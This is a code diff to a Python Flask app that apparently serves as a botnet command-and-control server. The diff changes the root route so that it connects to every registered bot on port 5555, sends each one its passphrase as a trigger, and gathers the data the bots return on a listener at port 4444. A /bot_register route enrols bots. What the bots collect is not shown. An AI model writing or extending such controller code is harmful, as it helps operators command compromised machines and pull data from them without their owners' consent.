@@ -20,20 +20,22 @@ def listner(system_ip, system_port):
     recieved_data = connection.recv(1024 * 100)
     return recieved_data.decode()
 
-def trigger():
+def trigger(bot_ip, bot_passphrase):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.connect((bot_ip, 5555))
+    sock.sendall(bytes(f"{bot_passphrase}",encoding="utf-8"))
+
+@app.route('/')
+def test():
+    data_package = ""
     bot_names = bot_dict.keys()
     for bot in bot_names:
         bot_ip = bot_dict[bot][0]
         bot_passphrase = bot_dict[bot][1]
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.connect((bot_ip, 5555))
-        sock.sendall(bytes(f"{bot_passphrase}",encoding="utf-8"))
-
-@app.route('/')
-def test():
-    trigger()
-    data = listner(system_ip, 4444)
-    return data
+        trigger(bot_ip, bot_passphrase)
+        data = listner(system_ip, 4444)
+        data_package = data_package + data
+    return data_package
 
 @app.route('/bot_register')
 def register_bot():
